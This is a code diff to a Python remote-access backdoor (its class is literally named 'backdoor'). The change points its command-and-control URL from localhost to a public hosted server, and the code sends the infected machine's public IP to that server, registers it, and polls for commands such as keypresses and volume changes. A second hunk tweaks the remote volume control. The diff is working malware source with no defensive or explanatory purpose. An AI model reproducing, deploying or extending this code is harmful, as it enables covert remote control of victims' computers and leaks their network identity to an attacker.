@@ -2,7 +2,7 @@ import requests,time,os,keyboard,pyautogui,webbrowser
 
 class backdoor:
     def __init__(self):
-        self.url = "http://127.0.0.1:8000/"
+        self.url = "https://pybackdoor.pythonanywhere.com/"
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
         while True:
@@ -125,7 +125,9 @@ class backdoor:
                     volume_command_argument = volume_command[1].replace(")", "")
                     print(volume_command_argument)
                     if int(volume_command_argument) < 0:
-                        pyautogui.press("volumemute")
+                        print("yes")
+                        for i in range(abs(int(volume_command_argument))):
+                            pyautogui.press("volumedown")
                     else:
                         for i in range(int(volume_command_argument)):
                             pyautogui.press("volumeup")
